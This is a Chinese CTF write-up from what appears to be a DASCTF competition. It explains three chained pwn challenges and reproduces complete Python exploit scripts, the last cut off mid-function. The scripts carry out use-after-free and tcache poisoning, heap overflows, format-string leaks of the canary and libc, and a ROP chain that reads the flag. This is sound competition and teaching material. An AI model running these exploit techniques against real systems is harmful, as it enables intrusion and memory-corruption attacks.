第一段从探针进入 broker。账本审计操作泄露真实的函数指针、堆指针与密钥；标记、丢弃与触碰操作构成释放后使用，污染探针的自定义空闲链表；制造指定类型的对象时会弹出攻击者指针 base+0x5110（可读写的.bss），并写入探针中继地址 0x1C10 与合法哈希；触发操作调用该指针，把客户端 fd 与 broker fd 桥接，进入 broker。第二段从 broker 进入 vault。broker 的窗口读操作会泄露相邻的路由对象，窗口写操作可以溢出其计数器、哈希与自身指针；随后调用 broker 中继地址 0x2120，把客户端 fd 与 vault fd 桥接。第三段在 vault 内取 flag：格式化字符串操作泄露密钥、flag 文件描述符、canary 与 libc 地址；栈溢出在保留正确 canary 的前提下构造 ROP，先 read(flagfd, libc 可写地址, 0x200)，再 write(1, 可写地址, 0x200)，把 flag 打到 socket。

本地使用补丁环境完整打通六次，包括服务重启后的稳定复现；远程与本地零差异，使用题目自带的 libc 与加载器，偏移一致，远程一次成功，得到 DASCTF{66750917978933250835878997716903}。本题的关键不是单点漏洞，而是把探针的自定义空闲链表、broker 的窗口读写、vault 的格式化字符串与保留 canary 的栈溢出按顺序组合，并通过文件描述符桥接把能力逐级传递。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

三段桥接利用脚本的代码如下。

```python
#!/usr/bin/env python3
"""justledger multi-stage exploit (local/remote). Stages:
A. SQL/probe lease UAF -> bind
B. probe freelist poisoning -> arbitrary write -> ledger_fire -> fd relay to broker
C. broker protocol: leak, heap overflow into TOUR, call relay -> vault
D. vault: format-string leak -> stack overflow ROP -> read flag fd, write to us
"""
import socket, struct, time, sys, re

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

ror = lambda x, n: ((x >> n) | (x << (64 - n))) & 0xFFFFFFFFFFFFFFFF
rol = lambda x, n: ((x << n) | (x >> (64 - n))) & 0xFFFFFFFFFFFFFFFF

class Conn:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=8)
        self.s.settimeout(8)
        self.buf = b''
    def recv_some(self, timeout=2.0):
        self.s.settimeout(timeout)
        try:
            c = self.s.recv(65536)
        except socket.timeout:
            return b''
        if not c:
            return b''
        self.buf += c
        return c
    def read_until(self, marker, timeout=8.0):
        end = time.time() + timeout
        while marker not in self.buf:
            if time.time() > end:
                return None
            if not self.recv_some(min(0.5, max(0.01, end - time.time()))):
                if time.time() > end:
                    return None
        i = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out
    def send(self, data):
        self.s.sendall(data)
    def sql(self, stmt, timeout=8.0):
        self.send(stmt.encode() + b'\n')
        out = self.read_until(b'OK\n', timeout) or self.read_until(b'ERR', timeout)
        return out
    def close(self):
        self.s.close()

def audit_leak(rowhex):
    b = bytes.fromhex(rowhex.strip())
    assert len(b) == 32, b
    fn = struct.unpack('<Q', b[0:8])[0]
    self_ = struct.unpack('<Q', b[8:16])[0]
    cookie = struct.unpack('<Q', b[16:24])[0]
    return fn, self_, cookie

def parse_row(out):
    # out like b'ROW <hex>\nOK\n'
    m = re.search(rb'ROW ([0-9a-fA-F-]+)\n', out or b'')
    if not m:
        return None
    return m.group(1).decode()

def stage_ab(c):
    banner = c.read_until(b'justledger\n', timeout=5)
    print('[A] banner:', banner)
    b96 = bytes([0x41]) * 96
    bound = False
    for form in ['SELECT ledger_bind(ledger_seed(),0);',
                 'SELECT ledger_bind(ledger_seed(),ledger_seed());',
                 'SELECT ledger_bind(ledger_seed(),0),ledger_seed();']:
        r = c.sql('SELECT * FROM ledger WHERE seal=ledger_seed();')
        r2 = c.sql(form)
        print('[A] bind try', form, '=>', r2)
        if r2 and b'ROW 31' in r2:
            bound = True
            break
    if not bound:
        raise SystemExit('bind failed')
    # obj0 kind1
    r = c.sql("SELECT ledger_make(0,1,x'%s');" % b96.hex()); print('[A] make0:', r)
    r = c.sql('SELECT ledger_mark(0);'); print('[A] mark0:', r)
    r = c.sql('SELECT ledger_audit();'); print('[A] audit0:', r)
    fn0, obj0, cookie0 = audit_leak(parse_row(r))
    base = fn0 - 0x1260
    q = cookie0 ^ ror(obj0, 12) ^ fn0
    print('[A] fn=%#x obj0=%#x base=%#x q=%#x lowbit=%d' % (fn0, obj0, base, q, q & 1))
    # obj1 kind1
    r = c.sql("SELECT ledger_make(1,1,x'%s');" % (bytes([0x42]) * 96).hex()); print('[A] make1:', r)
    r = c.sql('SELECT ledger_mark(1);'); print('[A] mark1:', r)
    r = c.sql('SELECT ledger_audit();'); print('[A] audit1:', r)
    fn1, obj1, cookie1 = audit_leak(parse_row(r))
    print('[A] fn1=%#x obj1=%#x' % (fn1, obj1))
    # poison freelist: drop 0 then 1, touch writes obj1's free-link
    P = base + 0x5110
    poison = P ^ (obj1 >> 12)
    r = c.sql('SELECT ledger_drop(0);'); print('[A] drop0:', r)
    r = c.sql('SELECT ledger_drop(1);'); print('[A] drop1:', r)
    r = c.sql("SELECT ledger_touch(x'%s');" % struct.pack('<Q', poison).hex()); print('[A] touch:', r)
    r = c.sql("SELECT ledger_make(2,1,x'%s');" % (bytes([0x43]) * 96).hex()); print('[A] make2:', r)
    target = struct.pack('<Q', base + 0x1C10)
    target += struct.pack('<Q', rol(q ^ (base + 0x1C10) ^ 0x91E10DA5C79B43F2, 23))
    target += b'\x00' * (96 - len(target))
    r = c.sql("SELECT ledger_make(3,2,x'%s');" % target.hex()); print('[A] make3:', r)
    if not r or b'ERR' in r:
        raise SystemExit('arb write failed')
    # fire: enters relay, no output
    c.send(b'SELECT ledger_fire();\n')
    time.sleep(0.3)
    out = c.recv_some(2.0)
    print('[B] after fire recv:', out)
    return out

M64 = 0xFFFFFFFFFFFFFFFF

def splitmix(x):
    x &= M64
    t = (0xBF58476D1CE4E5B9 * ((x ^ (x >> 30)) & M64)) & M64
    u = (t ^ (t >> 27)) & M64
    v = (0x94D049BB133111EB * u) & M64
    return (v ^ (v >> 31)) & M64

class Stream:
    """byte stream with exact reads over the live connection"""
    def __init__(self, c):
        self.c = c
    def read_exact(self, n, timeout=8.0):
        end = time.time() + timeout
        while len(self.c.buf) < n:
            if time.time() > end:
                raise TimeoutError('read_exact %d have %d' % (n, len(self.c.buf)))
            if not self.c.recv_some(0.5):
                if time.time() > end:
                    raise TimeoutError('read_exact eof')
        out, self.c.buf = self.c.buf[:n], self.c.buf[n:]
        return out
    def send(self, b):
        self.c.send(b)
    def broker_cmd(self, cmd, idx, payload=b'', reply=True):
        self.send(struct.pack('<BBH', cmd, idx, len(payload)) + payload)
        if not reply:
            return None
        hdr = self.read_exact(4)
        status, rcmd, rlen = struct.unpack('<BBH', hdr)
        data = self.read_exact(rlen) if rlen else b''
        return status, rcmd, data

def stage_c(c):
    st = Stream(c)
    banner = st.read_exact(8)
    print('[C] broker banner:', banner)
    assert banner == b'LBR3\x03\x00\x00\x00', banner
    # 1. WINDOW idx 0, TOUR idx 1 (allocated after -> higher address)
    print('[C] 1:', st.broker_cmd(0x31, 0, b''))
    print('[C] Y:', st.broker_cmd(0x59, 1, b''))
    # 2. read beyond WINDOW to locate TOUR object (magic scan)
    magic = bytes.fromhex('0000334554554f52')
    d = None; abs_off = None
    for roff, rlen in [(0xF0, 0x180), (0x100, 0x600), (0x100, 0x400)]:
        if roff + rlen > 0x100 + 0x600:
            continue
        if ((roff + rlen) & 0xFF) > 0x70 or roff > 0x100 or rlen > 0x600:
            continue
        r = st.broker_cmd(0x6A, 0, struct.pack('<HH', roff, rlen))
        if r[0] != 0:
            continue
        dd = r[2]
        xi = dd.find(magic)
        print('[C] j read off=%#x len=%#x -> %d bytes, magic at %d' % (roff, rlen, len(dd), xi))
        if xi >= 0:
            d = dd; X = xi; abs_off = 0x40 + roff + xi
            break
    assert d is not None, 'TOUR not found after window'
    obj_t = struct.unpack('<Q', d[X+32:X+40])[0]
    integ40 = struct.unpack('<Q', d[X+40:X+48])[0]
    fn1760 = struct.unpack('<Q', d[X+48:X+56])[0]
    bbase = fn1760 - 0x1760
    q = ror(obj_t, 17) ^ fn1760 ^ integ40
    print('[C] obj_t=%#x abs=%#x bbase=%#x q=%#x lowbit=%d' % (obj_t, abs_off, bbase, q, q & 1))
    assert q & 1
    assert (fn1760 - bbase) == 0x1760
    # 5. craft fake TOUR + overflow payload placed via 'k' (v45<=0x100, v46<=0x220,
    #    (v45+v46)&0xff <= 0x70, dest=obj+v45+0x40)
    target = bbase + 0x2120  # relay fd0<->fd3
    counter = 1
    v16 = rol((obj_t ^ q ^ target) & M64, 29)
    h = splitmix(q ^ v16 ^ counter ^ 0x6F27C4B19A5E38D2)
    plan = None
    for woff in (0xF0, 0x100, 0xE0, 0xD0, 0xC0, 0xB0, 0xA0, 0x90, 0x80):
        base_o = 0x40 + woff
        if base_o > abs_off:
            continue
        p = abs_off - base_o
        for wlen in range(p + 0x40, 0x221):
            if ((woff + wlen) & 0xFF) <= 0x70:
                plan = (woff, wlen, p)
                break
        if plan:
            break
    assert plan is not None, 'no reachable k write for TOUR'
    woff, wlen, p = plan
    payload = bytearray(b'\x00' * wlen)
    struct.pack_into('<QQQQQ', payload, p, 0x524F555445330000, counter, v16, h, obj_t)
    print('[C] k write off=%#x len=%#x p=%#x target=%#x v16=%#x hash=%#x' % (woff, wlen, p, target, v16, h))
    r = st.broker_cmd(0x6B, 0, struct.pack('<HH', woff, wlen) + bytes(payload))
    print('[C] k:', r)
    # 6. fire TOUR -> relay to vault
    st.send(struct.pack('<BBH', 0x7E, 1, 0))
    time.sleep(0.3)
    try:
        vb = st.read_exact(8, timeout=5)
        print('[C] vault banner:', vb)
    except TimeoutError as e:
        print('[C] no vault banner:', e)
        return None
    return st

READ_OFF = 0x114920
WRITE_OFF = 0x1149C0
POP_RDI = 0x2A3E5
POP_RSI_R15 = 0x2A3E3
POP_RDX_RBX = 0x90469
SCRATCH_OFF = 0x21C000

def p64(x):
    return struct.pack('<Q', x & M64)

def stage_d(st):
    # st is Stream over the relayed connection; vault banner already consumed in stage_c
    fmt = b'%1$lx.%3$lx.%4$lx.%5$lx.%2$lx'
    st.send(struct.pack('<BBH', 0x91, 0, len(fmt)) + fmt)
    line = b''
    end = time.time() + 8
    while not line.endswith(b'\n') and time.time() < end:
        line += st.read_exact(1, timeout=2)
    print('[D] leak line:', line)
    vals = [int(x, 16) for x in line.strip().split(b'.')]
    a4, a6, a7, a8, a5 = vals
    vbase = (a4 ^ a8 ^ 0x58DF37A91C62E40B) - 0x1AC0
    q = a4 ^ (vbase + 0x1AC0)
    fd = a6 ^ ror(q, 9)
    canary = a7 ^ rol(q, 31)
    print('[D] vbase=%#x q=%#x fd=%d canary=%#x' % (vbase, q, fd, canary))
    assert q & 1
    lbase = (a5 ^ rol(q, 13)) - READ_OFF
    read_addr = lbase + READ_OFF
    write_addr = lbase + WRITE_OFF
    scratch = lbase + SCRATCH_OFF
    print('[D] a5=%#x lbase=%#x read=%#x write=%#x scratch=%#x' % (a5, lbase, read_addr, write_addr, scratch))
    chain = b''
    chain += p64(lbase + POP_RDI) + p64(fd)
    chain += p64(lbase + POP_RSI_R15) + p64(scratch) + p64(0)
    chain += p64(lbase + POP_RDX_RBX) + p64(0x200) + p64(0)
    chain += p64(read_addr)
    chain += p64(lbase + POP_RDI) + p64(1)
    chain += p64(lbase + POP_RSI_R15) + p64(scratch) + p64(0)
    chain += p64(lbase + POP_RDX_RBX) + p64(0x200) + p64(0)
    chain += p64(write_addr)
    payload = b'A' * 0x108 + p64(canary) + p64(0) + p64(0) + p64(0) + chain
    assert len(payload) <= 0x280 - 0
    # read length must satisfy (len & 0xff) <= 0x80 and len <= 0x400
    payload = payload.ljust(0x280, b'B')
    print('[D] payload len', len(payload))
    st.send(struct.pack('<BBH', 0xA7, 0, len(payload)) + payload)
    time.sleep(0.5)
    out = b''
    end = time.time() + 5
    while time.time() < end:
        try:
            chunk = st.c.recv_some(0.5)
        except Exception:
            break
        if not chunk:
            if out:
                break
            continue
        out += chunk
    print('[D] flag output:', out[:200])
    return out

if __name__ == '__main__':
    c = Conn(HOST, PORT)
    out = stage_ab(c)
    print('[B] final buffered:', c.buf, 'extra recv:', c.recv_some(1.0))
    st = stage_c(c)
    if st:
        out = stage_d(st)
        m = re.search(rb'(DASCTF\{[^}]*\}|flag\{[^}]*\})', out or b'')
        print('[FLAG]', m.group(1).decode() if m else 'NOT FOUND')
```

### xmlbridge

xmlbridge（平台编号 12073，本队得分 499.59）是一道五跳 XML 桥接题。前端使用一字节操作码加四字节大端长度的帧格式，操作码包括加载、插入、读取、创建、保存、求值、代理、发布与删除；后端各跳使用两字节大端长度。调用链为 xmlbridge 到 broker 到 manifestvault 到 keeper，最终由 oracle 持有 flag，各服务的问候串都通过统一的写函数封装。第一跳的入口是一次释放后复用：求值操作会释放一个 0x500 缓冲区，随后创建操作中的字典创建函数复用这块内存，一个 DTD 解析错误会把字典大小从 128 增加到 129；字典表与标记缓冲区相邻，构造一个哈希到第 128 槽的元素名，就会在标记缓冲区写入有效位，从而开启后续的发布与删除操作。字典的随机种子来自时间，因此可以预测。

第二跳 broker 提供任意相对读，泄露 PIE 基址、文件描述符、草稿指针和随机数；提交操作是没有 canary 的栈溢出，配合合法的桥接 MAC 即可返回到代理函数，把连接转发给 manifestvault。第三跳通过纠正与分层操作进行 tcache 投毒，覆盖全局变量，满足触发条件后调用代理函数进入 keeper。第四跳 keeper 用格式化字符串泄露 PIE 与 canary，再用栈溢出返回到代理函数进入 oracle。第五跳 oracle 的有符号虚拟机寄存器索引可以泄露 PIE 并改写会话字段，操作码 4 调用输出函数把 flag 打印出来。本地在隔离副本中完整跑通并返回本地测试 flag；动态环境还独立验证了 libxml2 2.9.13 的时间种子字典哈希预测与标记缓冲区置位细节。最终 flag 为 DASCTF{68895368246319039617552845046338}。本题入口是释放后复用加相邻布局导致的字节级状态篡改，之后每一跳都是标准原语，难点在于把五跳串起来并正确处理每跳的帧格式与校验。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

五跳利用脚本的代码如下。

```python
#!/usr/bin/env python3
import socket, struct, time, subprocess, os, sys, random, string, re, select

M64=(1<<64)-1; M32=(1<<32)-1
def rol(x,r):
    r&=63; x&=M64
    return ((x<<r)|(x>>(64-r)))&M64 if r else x
def H(a):
    a&=M64
    x=a; x^=x>>30; x=(x*0xBF58476D1CE4E5B9)&M64; x^=x>>27; x=(x*0x94D049BB133111EB)&M64; x^=x>>31
    return x&M64
def ror(x,r): return rol(x,64-r)
def p64(x): return struct.pack('<Q',x&M64)

class Front:
    def __init__(self, mode='local', host=None, port=None):
        self.mode=mode; self.buf=b''
        if mode=='local':
            a,b=socket.socketpair()
            self.sock=a
            self.proc=subprocess.Popen(['/tmp/xb2/ld-linux-x86-64.so.2','--library-path','/tmp/xb2','/tmp/xb2/xmlbridge'],
                                       stdin=b.fileno(), stdout=b.fileno(), stderr=subprocess.DEVNULL,
                                       pass_fds=(b.fileno(),))
            b.close()
        else:
            self.sock=socket.create_connection((host,port),timeout=5)
            self.sock.settimeout(5)
            self.proc=None
    def send(self,op,body=b''):
        self.sock.sendall(bytes([ord(op)])+struct.pack('>I',len(body))+body)
    def recvn(self,n):
        d=b''
        while len(d)<n:
            c=self.sock.recv(n-len(d))
            if not c: raise EOFError('frontend closed')
            d+=c
        return d
    def line(self):
        d=b''
        while not d.endswith(b'\n'):
            c=self.sock.recv(1)
            if not c: raise EOFError('frontend closed')
            d+=c
            if len(d)>200000: break
        return d
    def simple(self,op,body=b''):
        self.send(op,body); return self.line()
    def d(self,body):
        self.send('D',body)
        h=self.recvn(4)
        if h==b'ERR\n': return None
        n=struct.unpack('>I',h)[0]
        if n>0x1000: raise ValueError('bad d len %r'%h)
        return self.recvn(n)
    def close(self):
        try: self.sock.close()
        except: pass
        if self.proc: 
            try: self.proc.kill()
            except: pass

# ---- frontend marker exploit ----
def rand_r(seed):
    n=seed & M32
    n=(n*1103515245+12345)&M32; r=(n//65536)%2048
    n=(n*1103515245+12345)&M32; r=(r<<10)^((n//65536)%1024)
    n=(n*1103515245+12345)&M32; r=(r<<10)^((n//65536)%1024)
    return n & M32, r
def dict_seed(T, idx=3):
    s=T & M32
    for _ in range(idx+1):
        s,val=rand_r(s)
    return val
def bigkey(data, seed):
    h=seed & M32
    for b in data:
        h=(h+b)&M32; h=(h+(h<<10))&M32; h^=h>>6
    h=(h+(h<<3))&M32; h^=h>>11; h=(h+(h<<15))&M32
    return h
def find_name(seed,size=129,target=128,tries=300000):
    rnd=random.Random(seed)
    for _ in range(tries):
        n=rnd.randrange(4,32)
        name=(rnd.choice(string.ascii_letters+'_')+''.join(rnd.choice(string.ascii_letters+string.digits+'_') for _ in range(n-1))).encode()
        if bigkey(name,seed)%size==target: return name
    return None
def marker_A(T, span=6):
    names=[]
    for t in range(T-span,T+span+1):
        s=dict_seed(t)
        n=find_name(s)
        if n and n not in names: names.append(n)
    A=b'<!DOCTYPE r [<!ELEMENT r ANY>]><r><q/>'+b''.join(b'<'+n+b'/>' for n in names)+b'</r>'
    return A
def front_setup(f, T=None):
    T=int(time.time()) if T is None else T
    L=b'<sheet><item>x</item></sheet>'
    I=b'<root><target>y</target></root>'
    for op,body in [('L',L),('I',I),('R',b'hello'),('C',b''),('S',b''),('E',b'world')]:
        r=f.simple(op,body)
        if r!=b'OK\n': raise RuntimeError('setup %s -> %r'%(op,r))
    A=marker_A(T)
    r=f.simple('A',A)
    if r!=b'OK\n': raise RuntimeError('A -> %r'%r)
    r=f.simple('B',b'')
    if not r.startswith(b'DOC'): raise RuntimeError('B -> %r'%r)
    return True

# ---- broker stage ----
def dexpect(f, body, ctx=''):
    r=f.d(body)
    if r is None: raise RuntimeError('D returned ERR at %s body=%r'%(ctx,body[:48]))
    return r

def view_note(v15_lo, offset, v15_hi=b'\x00'*8):
    b=bytearray(0x90)
    b[0:6]=b'RCPTv2'; b[6]=0; b[7]=0
    b[8:16]=v15_lo[:8]
    b[16:24]=v15_hi[:8]
    b[24:30]=b'REVIEW'; b[30:32]=b'\x00\x00'
    b[32:37]=b'READY'; b[37:40]=b'\x00\x00\x00'
    struct.pack_into('<Q',b,40,offset)
    struct.pack_into('<Q',b,48,8)
    return bytes(b)

def commit_note(v15_lo, L, v15_hi=b'\x00'*8):
    b=bytearray(0x90)
    b[0:6]=b'RCPTv2'; b[6]=0; b[7]=0
    b[8:16]=v15_lo[:8]; b[16:24]=v15_hi[:8]
    b[24:32]=b'PRIVATE\x00'
    b[32:40]=b'READY\x00\x00\x00'
    struct.pack_into('<Q',b,48,L)
    return bytes(b)

def notex(f, buf):
    hx=buf.hex().encode()
    return dexpect(f, b'NOTE <note>'+hx+b'</note>', 'NOTE')

def viewx(f):
    r=dexpect(f,b'VIEW\n','VIEW')
    if len(r)!=15 or not r.startswith(b'WINDOW '): raise RuntimeError('bad VIEW resp %r'%r)
    return struct.unpack('<Q', r[7:15])[0]

def broker_stage(f, verbose=False):
    r=dexpect(f, b'OPEN <receipt>AAAA</receipt>','OPEN')
    m=re.search(rb'TICKET ([0-9a-fA-F]{8})\n', r)
    if not m: raise RuntimeError('bad OPEN resp %r'%r)
    ticket=m.group(1)
    dexpect(f,b'ARCHIVE\n','ARCHIVE')
    vlo=ticket
    # VIEW1: &sub_1E0A at 0x323e
    notex(f, view_note(vlo,0x323e)); leak1=viewx(f); dexpect(f,b'RELEASE\n','REL1')
    base=leak1-0x1e0a
    dexpect(f,b'DRAFT\n','DRAFT')
    # VIEW2: qword_5038 draft ptr at 0x322e
    notex(f, view_note(vlo,0x322e)); q5038=viewx(f); dexpect(f,b'RELEASE\n','REL2')
    # VIEW3: qword_5030 fd pack at 0x3226
    notex(f, view_note(vlo,0x3226)); q5030=viewx(f); dexpect(f,b'RELEASE\n','REL3')
    # VIEW4: qword_5040 random at 0x3236
    notex(f, view_note(vlo,0x3236)); q5040=viewx(f); dexpect(f,b'RELEASE\n','REL4')
    if verbose:
        print('[broker] ticket=%s base=%#x draft=%#x fds=%#x rand=%#x'%(ticket.decode(),base,q5038,q5030,q5040))
    L=0x380
    notex(f, commit_note(vlo,L))
    mac1=H(q5038 ^ q5040 ^ q5030 ^ 0x584D4C4252494447)
    mac2=((q5030 + q5038)&M64) ^ leak1 ^ rol(q5040,29)
    mac3=H(leak1 ^ q5040 ^ 0x4341504142494C49)
    draft=bytearray(L)
    draft[0:7]=b'XBRDGv3'; draft[7]=0
    struct.pack_into('<Q',draft,8,3)
    struct.pack_into('<Q',draft,16,mac1)
    struct.pack_into('<Q',draft,24,mac2)
    struct.pack_into('<Q',draft,32,mac3)
    struct.pack_into('<Q',draft,0x100,0)
    struct.pack_into('<Q',draft,0x108,base+0x1844)
    hx=draft.hex().encode()
    r=dexpect(f, b'WRITE <draft>'+hx+b'</draft>','WRITE')
    if r!=b'WRITTEN\n': raise RuntimeError('WRITE %r'%r)
    r=dexpect(f,b'COMMIT\n','COMMIT')
    if verbose: print('[broker] commit resp %r'%r)
    return r

# ---- manifestvault stage ----
MV_CONST=0x6D6E667374000000
def mv_stage(f, verbose=False):
    r=dexpect(f,b'HELLO\n','mv HELLO')
    m=re.search(rb'MV3 ([0-9a-fA-F]{16})\n', r)
    if not m: raise RuntimeError('bad MV3 %r'%r)
    secret=int(m.group(1),16)
    # mint two manifests with value 0
    tickets=[]
    for st in (0,1):
        v20=H(0 ^ secret ^ ((st+MV_CONST)&M64))
        if v20==0: v20=st+1
        tickets.append(v20)
        body=b'MINT %016x\n'%0
        rr=dexpect(f,body,'mv MINT%d'%st)
        mm=re.search(rb'TICKET ([0-9a-fA-F]{16})\n', rr)
        if not mm: raise RuntimeError('bad MINT %r'%rr)
        if int(mm.group(1),16)!=v20: raise RuntimeError('ticket mismatch')
    t0,t1=tickets
    r=dexpect(f,b'INDEX %016x\n'%t0,'mv INDEX')
    if r!=b'INDEXED\n': raise RuntimeError('INDEX %r'%r)
    r=dexpect(f,b'DROP %016x\n'%t1,'mv DROP1')
    if r!=b'DROPPED\n': raise RuntimeError('DROP1 %r'%r)
    r=dexpect(f,b'DROP %016x\n'%t0,'mv DROP0')
    if r!=b'DROPPED\n': raise RuntimeError('DROP0 %r'%r)
    r=dexpect(f,b'GLANCE %016x\n'%t0,'mv GLANCE')
    mm=re.search(rb'TRACE ([0-9a-fA-F]{16}) ([0-9a-fA-F]{16}) ([0-9a-fA-F]{16})\n', r)
    if not mm: raise RuntimeError('bad GLANCE %r'%r)
    f4,f5,f6=[int(x,16) for x in mm.groups()]
    sub1a28=f5 ^ v20 ^ rol(secret,17) if False else (f5 ^ tickets[0] ^ rol(secret,17))
    base_mv=sub1a28-0x1a28
    A0=f4 ^ H(tickets[0] ^ secret)
    sub1b46=base_mv+0x1b46
    target=base_mv+0x5020
    poison=target ^ (A0>>12)
    mac=H(secret ^ poison ^ f6 ^ t0)
    body=b'CORRECT %016x %016x %016x\n'%(t0,poison,mac)
    r=dexpect(f,body,'mv CORRECT')
    if r!=b'CORRECTED\n': raise RuntimeError('CORRECT %r'%r)
    # LAYER 1: dummy
    r=dexpect(f,b'LAYER '+b'\x00'*0x120,'mv LAYER1')
    if r!=b'LAYERED\n': raise RuntimeError('LAYER1 %r'%r)
    # LAYER 2: payload at globals
    p=bytearray(0x120)
    p[0:8]=b'MNFSTv3\x00'
    q5030=sub1b46
    v26=t0 ^ rol(t1,9)
    v27=q5030 ^ H(secret ^ t0) ^ 0x4D414E4946455354
    v28=rol((t1+q5030)&M64,23) ^ H(secret)
    struct.pack_into('<Q',p,8,3)
    struct.pack_into('<Q',p,16,q5030)
    struct.pack_into('<Q',p,24,secret)
    struct.pack_into('<Q',p,32,v26)
    struct.pack_into('<Q',p,40,v27)
    struct.pack_into('<Q',p,48,v28)
    r=dexpect(f,b'LAYER '+bytes(p),'mv LAYER2')
    if r!=b'LAYERED\n': raise RuntimeError('LAYER2 %r'%r)
    if verbose:
        print('[mv] secret=%#x base=%#x A0=%#x target=%#x f4=%#x f6=%#x'%(secret,base_mv,A0,target,f4,f6))
    r=dexpect(f,b'TRIGGER\n','mv TRIGGER')
    if verbose: print('[mv] trigger resp %r'%r)
    return r

# ---- keeper stage ----
def keeper_stage(f, verbose=False):
    r=dexpect(f,b'HELLO\n','k HELLO')
    m=re.search(rb'K4 ([0-9a-fA-F]{16})\n', r)
    if not m: raise RuntimeError('bad K4 %r'%r)
    secret=int(m.group(1),16)
    r=dexpect(f,b'AUDIT %2$lx %3$lx','k AUDIT1')
    parts=r.split()
    if len(parts)<2: raise RuntimeError('bad AUDIT %r'%r)
    a2=int(parts[0],16); a3=int(parts[1],16)
    base=a2-0x176b
    canary=a3 ^ H(secret)
    if verbose: print('[keeper] secret=%#x base=%#x canary=%#x'%(secret,base,canary))
    dexpect(f,b'AUDIT X','k AUDIT2')
    payload=b'A'*264 + p64(canary) + p64(0) + p64(base+0x176b)
    body=b'COMMIT '+payload
    r=dexpect(f,body,'k COMMIT')
    if verbose: print('[keeper] commit resp %r'%r)
    return r

# ---- oracle stage ----
def oracle_stage(f, verbose=False):
    r=dexpect(f,b'HELLO\n','o HELLO')
    m=re.search(rb'O5 ([0-9a-fA-F]{16})\n', r)
    if not m: raise RuntimeError('bad O5 %r'%r)
    secret=int(m.group(1),16)
    def instr(op,a=0,b=0,imm=0):
        return bytes([op,a&0xff,b&0xff])+b'\x00'*5+p64(imm)
    # PROGRAM1: push idx -2
    prog1=instr(1,0xfe)
    body=b'PROGRAM '+prog1
    r=dexpect(f,body,'o PROGRAM1')
    if r!=b'LOADED\n': raise RuntimeError('PROGRAM1 %r'%r)
    r=dexpect(f,b'RUN\n','o RUN1')
    m=re.search(rb'TRACE ([0-9a-fA-F]{16})', r)
    if not m:
        # program state may have advanced; try direct
        raise RuntimeError('bad TRACE %r'%r)
    leak=int(m.group(1),16)
    base_o=leak-0x1684
    if verbose: print('[oracle] secret=%#x sub1684=%#x base=%#x'%(secret,leak,base_o))
    const=0x4F5241434C453576
    v14=H(secret ^ const)
    fp=base_o+0x16b6
    v15=v14 ^ rol((fp ^ secret)&M64,21)
    prog2=instr(2,0xfd,0,0)  # placeholder replaced below
    prog2 = (instr(2,0xfd,0,v14) + instr(2,0xfe,0,fp) + instr(2,0xff,0,v15) + instr(4))
    body=b'PROGRAM '+prog2
    r=dexpect(f,body,'o PROGRAM2')
    if r!=b'LOADED\n': raise RuntimeError('PROGRAM2 %r'%r)
    r=dexpect(f,b'RUN\n','o RUN2')
    if verbose: print('[oracle] run2 resp %r'%r)
    return r
```

### redisrelay

redisrelay是一道多级中继链题。前端由 module、broker、attestor、vault、routeledger 与 council 等一串同源服务组成，各层使用独立帧格式，上游通过封装把下游响应原样回传，因此可以把 broker、attestor 与 vault 当成透明中继，直接与账本对话。关键突破在账本协议：状态初始化用 12 组乱序的标签与值对填充状态表，标签落在偶数位置；第 0x10 号命令的四个槽位都接受负 32 到 31 的索引，第二次取数时用 0xC0 加八倍索引寻址，负数可以读到整个表；四条命令各返回六个数，正好覆盖 24 个表项。读取公式需要先用长度为零的 0x7F 命令泄露四个槽的混合值，再用返回值的循环右移、槽位与序号的混合来还原表项。

由表项恢复出随机数 A、B，四个密钥，两个盐和一个全局值，并按提交顺序更新全局值，最后用两个混合函数计算的 q0 与 q1 发送 0x11 号命令，得到 0x81 解锁响应。解锁后，0x22 号的释放后使用读泄露堆指针与目标地址；0x23 号以目标地址异或堆指针右移 12 位的值做 tcache 投毒；0x24 号把许可结构写入.bss 的目标地址；0x30 到 0x34 号再把中继结构覆盖到指定地址。0x40 号校验器通过后置位，返回中继与议会字样。议会阶段先用 0x7F 问候泄露 PIE，再让 0x10 号命令的前四次调用把末位参数字节取 0xFC 到 0xFF，利用有符号数绕过检查并匹配状态值，从乱序表恢复议会密钥与 PIE；随后用 0x20 号命令提交 512 字节计划，把校验门嵌入计划偏移 0x100 处，再用 0x30 到 0x34 号把门镜像经 tcache 投毒放到目标地址，最后 0x40 号命令触发读取 flag 的发送函数。

对远程 1.14.76.59:23676 一次完成从 module 到 council 的全链，账本 0x11 得到 0x81，许可 0x40 返回中继与议会字样，议会计划 0x20 返回 0x90，门 0x40 返回 0xC0 与 41 字节的 DASCTF{24092190822449365053592936181340}。本题的杠杆是同源多实例与协议复用：broker、attestor、vault 只是中继，真正入口在账本的负索引读表；一旦恢复状态密钥，后续许可与议会都是基于同一套混合函数与 tcache 用户指针投毒的确定性构造。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

全链利用脚本的代码如下。

```python
def mix2(y):
    y&=M; w=(C2*(y^(y>>27)))&M; return (w^(w>>31))&M
def sub2600(a1,a2,a3,a4,a5,K):
    K0,K1,K2,K3=K
    v6=K1^a3^0x243F6A8885A308D3
    v7=K2^a4^0x13198A2E03707344
    v8=a1^K0^a2
    v9=K3^a5^0xA4093822299F31D0
    v5=0
    for _ in range(10):
        v10=(rol(v6,7)+v8)&M
        v11=v9
        v9=v6^rol(v7,19)
        v6=v11^ror(v10,21)
        v12=(v5+rol(v11,31))&M
        x=(v10^v5^a1)&M
        v13=(C1*(x^(x>>30)))&M
        v5+=1
        y=(v9+v7+v12)&M
        v14=(C1*(y^(y>>30)))&M
        v8=mix2(v13); v7=mix2(v14)
    return mix((v7^v8^v6^v9^a1)&M)

def procs():
    out={}
    import os as _os
    for d in _os.listdir('/proc'):
        if not d.isdigit(): continue
        try: c=open('/proc/%s/cmdline'%d,'rb').read().replace(b'\0',b' ').decode()
        except: continue
        if 'routevault' in c or 'routeledger' in c: out[int(d)]=c.strip()
    return out
GOLD=0x9E3779B97F4A7C15
def sub2ab0(a1,a2,a3,a4,a5,K):
    K0,K1,K2,K3=K
